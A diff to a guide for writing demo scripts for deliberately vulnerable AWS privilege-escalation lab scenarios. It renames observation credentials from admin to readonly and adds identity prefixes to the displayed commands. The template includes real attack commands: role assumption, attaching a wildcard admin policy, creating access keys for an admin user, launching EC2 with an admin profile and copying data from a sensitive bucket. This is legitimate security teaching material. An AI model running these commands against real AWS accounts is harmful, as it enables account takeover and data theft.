@@ -44,12 +44,12 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
-# Extract admin cleanup credentials for observation/polling steps
-ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
-ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
 
-if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
-    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
     exit 1
 fi
 
@@ -75,9 +75,9 @@ use_starting_user_creds() {
     export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
     unset AWS_SESSION_TOKEN
 }
-use_admin_creds() {
-    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
-    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
     unset AWS_SESSION_TOKEN
 }
 ```
@@ -106,9 +106,9 @@ echo "Using region: $AWS_REGION"
 Every step in the demo script must be categorized as either **EXPLOIT** or **OBSERVATION**:
 
 - **`# [EXPLOIT]`** steps use `use_starting_user_creds()` -- these are the actual attack actions (PassRole, CreateFunction, AssumeRole, etc.)
-- **`# [OBSERVATION]`** steps use `use_admin_creds()` -- these are non-exploit actions (polling status, listing resources, VPC/subnet discovery, verifying policy attachments, checking logs)
+- **`# [OBSERVATION]`** steps use `use_readonly_creds()` -- these are non-exploit actions (polling status, listing resources, VPC/subnet discovery, verifying policy attachments, checking logs)
 
-**Key principle**: The starting user should ONLY have the permissions needed for the exploit. All observation, polling, and verification steps use the admin cleanup user. This ensures the Terraform permissions accurately reflect what's truly needed for the attack.
+**Key principle**: The starting user should ONLY have the permissions needed for the exploit. All observation, polling, and verification steps use the readonly user. This ensures the Terraform permissions accurately reflect what's truly needed for the attack.
 
 ## CRITICAL: AWS Region Handling Rules
 
@@ -132,8 +132,8 @@ export AWS_REGION=$AWS_REGION
 use_starting_user_creds
 export AWS_REGION=$AWS_REGION
 
-# When switching to admin for observation steps
-use_admin_creds
+# When switching to readonly for observation steps
+use_readonly_creds
 export AWS_REGION=$AWS_REGION
 ```
 
@@ -250,8 +250,9 @@ All demo scripts display AWS CLI commands inline before executing them, and trac
 **Key principle**: Attack commands are the ones that perform the privilege escalation technique or demonstrate the final impact (data exfiltration). Non-attack commands verify identity or prove access.
 
 ### Display Format
-- `show_cmd` renders in **dim** text (`\033[2m`) — visible but not attention-grabbing
-- `show_attack_cmd` renders in **cyan** text (`\033[0;36m`) with a leading newline — visually distinct, and recorded in an array for the end-of-script summary
+- `show_cmd` renders in **dim** text (`\033[2m`) with an identity prefix (e.g., `[Attacker]`, `[ReadOnly]`) — visible but not attention-grabbing
+- `show_attack_cmd` renders in **cyan** text (`\033[0;36m`) with an identity prefix and a leading newline — visually distinct, and recorded in an array for the end-of-script summary
+- Both functions take an identity string as their first argument: `show_cmd "Attacker" "aws ..."` or `show_cmd "ReadOnly" "aws ..."`
 - Multi-line AWS commands (using `\` continuations) are shown as a **single-line equivalent** in the display string
 - Shell redirections (`> /dev/null`, `2>&1`, `| grep`) are **excluded** from display strings
 - Variables are left as-is in display strings — bash expands them at runtime
@@ -283,14 +284,16 @@ CYAN='\033[0;36m'
 # Track attack commands for summary
 ATTACK_COMMANDS=()
 
-# Display a command before executing it
+# Display a non-attack command with identity context
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
-# Display AND record an attack command
+# Display AND record an attack command with identity context
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -324,12 +327,12 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
-# Extract admin cleanup credentials for observation/polling steps
-ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
-ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
 
-if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
-    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
     exit 1
 fi
 
@@ -355,9 +358,9 @@ use_starting_user_creds() {
     export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
     unset AWS_SESSION_TOKEN
 }
-use_admin_creds() {
-    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
-    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
     unset AWS_SESSION_TOKEN
 }
 
@@ -369,7 +372,7 @@ export AWS_REGION=$AWS_REGION
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -381,7 +384,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -427,7 +430,7 @@ echo -e "${YELLOW}Step 4: Assuming the vulnerable role${NC}"
 ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/{role-name}"
 echo "Role ARN: $ROLE_ARN"
 
-show_attack_cmd "aws sts assume-role --role-arn $ROLE_ARN --role-session-name demo-session --query 'Credentials' --output json"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn $ROLE_ARN --role-session-name demo-session --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $ROLE_ARN \
     --role-session-name demo-session \
@@ -441,7 +444,7 @@ export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 export AWS_REGION=$AWS_REGION
 
 # Verify we assumed the role
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed role${NC}\n"
@@ -454,7 +457,7 @@ For **to-admin** scenarios:
 ```bash
 echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -468,7 +471,7 @@ For **to-bucket** scenarios:
 echo -e "${YELLOW}Step 5: Verifying we don't have bucket access yet${NC}"
 TARGET_BUCKET="pl-sensitive-data-$ACCOUNT_ID-{suffix}"
 echo "Attempting to access bucket: $TARGET_BUCKET"
-show_cmd "aws s3 ls s3://$TARGET_BUCKET"
+show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET"
 if aws s3 ls s3://$TARGET_BUCKET &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
 else
@@ -483,7 +486,7 @@ echo -e "${YELLOW}Step 6: Adding admin policy to our role${NC}"
 ROLE_NAME="{role-name}"
 echo "Modifying role: $ROLE_NAME"
 
-show_attack_cmd "aws iam put-role-policy --role-name $ROLE_NAME --policy-name EscalatedAdminPolicy --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
+show_attack_cmd "Attacker" "aws iam put-role-policy --role-name $ROLE_NAME --policy-name EscalatedAdminPolicy --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
 aws iam put-role-policy \
     --role-name $ROLE_NAME \
     --policy-name "EscalatedAdminPolicy" \
@@ -510,7 +513,7 @@ echo -e "${YELLOW}Step 6: Creating access keys for admin user${NC}"
 ADMIN_USER="{admin-user-name}"
 echo "Creating keys for: $ADMIN_USER"
 
-show_attack_cmd "aws iam create-access-key --user-name $ADMIN_USER --output json"
+show_attack_cmd "Attacker" "aws iam create-access-key --user-name $ADMIN_USER --output json"
 KEY_OUTPUT=$(aws iam create-access-key --user-name $ADMIN_USER --output json)
 NEW_ACCESS_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.AccessKeyId')
 NEW_SECRET_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.SecretAccessKey')
@@ -532,7 +535,7 @@ export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_KEY
 export AWS_REGION=$AWS_REGION
 
 # Verify new identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $ADMIN_IDENTITY"
 echo -e "${GREEN}✓ Now using admin credentials${NC}\n"
@@ -545,7 +548,7 @@ ADMIN_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/{admin-role-name}"
 INSTANCE_PROFILE="{instance-profile-name}"
 
 # Get AMI with explicit region flag
-show_cmd "aws ec2 describe-images --region $AWS_REGION --owners amazon --filters 'Name=name,Values=al2023-ami-2023.*-x86_64' 'Name=state,Values=available' --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text"
+show_cmd "ReadOnly" "aws ec2 describe-images --region $AWS_REGION --owners amazon --filters 'Name=name,Values=al2023-ami-2023.*-x86_64' 'Name=state,Values=available' --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text"
 AMI_ID=$(aws ec2 describe-images \
     --region $AWS_REGION \
     --owners amazon \
@@ -567,7 +570,7 @@ DEFAULT_SUBNET=$(aws ec2 describe-subnets \
     --output text)
 
 # Launch instance with explicit region flag
-show_attack_cmd "aws ec2 run-instances --region $AWS_REGION --image-id $AMI_ID --instance-type t3.micro --iam-instance-profile Name=$INSTANCE_PROFILE --subnet-id $DEFAULT_SUBNET --query 'Instances[0].InstanceId' --output text"
+show_attack_cmd "Attacker" "aws ec2 run-instances --region $AWS_REGION --image-id $AMI_ID --instance-type t3.micro --iam-instance-profile Name=$INSTANCE_PROFILE --subnet-id $DEFAULT_SUBNET --query 'Instances[0].InstanceId' --output text"
 INSTANCE_ID=$(aws ec2 run-instances \
     --region $AWS_REGION \
     --image-id $AMI_ID \
@@ -586,7 +589,7 @@ echo -e "${GREEN}✓ EC2 instance launched${NC}\n"
 echo -e "${YELLOW}Step 8: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -604,13 +607,13 @@ TARGET_BUCKET="pl-sensitive-data-$ACCOUNT_ID-{suffix}"
 echo "Attempting to access bucket: $TARGET_BUCKET"
 
 echo "Listing bucket contents..."
-show_attack_cmd "aws s3 ls s3://$TARGET_BUCKET/"
+show_attack_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET/"
 aws s3 ls s3://$TARGET_BUCKET/
 echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}"
 
 echo "Reading sensitive data..."
 DOWNLOAD_FILE="/tmp/sensitive-data-${ACCOUNT_ID}.txt"
-show_attack_cmd "aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt $DOWNLOAD_FILE"
+show_attack_cmd "Attacker" "aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt $DOWNLOAD_FILE"
 if aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt $DOWNLOAD_FILE; then
     echo -e "${GREEN}✓ Successfully read sensitive data!${NC}"
     echo -e "${GREEN}✓ BUCKET ACCESS CONFIRMED${NC}"
@@ -949,10 +952,10 @@ Before completing, verify:
 8. ✅ **Attack Commands summary section** in the final summary block (iterates over `ATTACK_COMMANDS` array)
 9. ✅ **`touch "$(dirname "$0")/.demo_active"`** at the very end of the script
 10. ✅ Resource names match Terraform outputs
-11. ✅ **Both credential sets retrieved**: starting user from grouped output, admin cleanup from `prod_admin_user_for_cleanup_*`
-12. ✅ **`use_starting_user_creds()` and `use_admin_creds()` helper functions defined**
+11. ✅ **Both credential sets retrieved**: starting user from grouped output, readonly from `prod_readonly_user_*`
+12. ✅ **`use_starting_user_creds()` and `use_readonly_creds()` helper functions defined**
 13. ✅ **Every step marked with `# [EXPLOIT]` or `# [OBSERVATION]`**
-14. ✅ **Exploit steps use `use_starting_user_creds()`**, observation steps use `use_admin_creds()`
+14. ✅ **Exploit steps use `use_starting_user_creds()`**, observation steps use `use_readonly_creds()`
 15. ✅ **Region retrieved from Terraform output**
 16. ✅ **Region re-exported at every credential switch**
 17. ✅ **All EC2 commands have explicit --region flags**
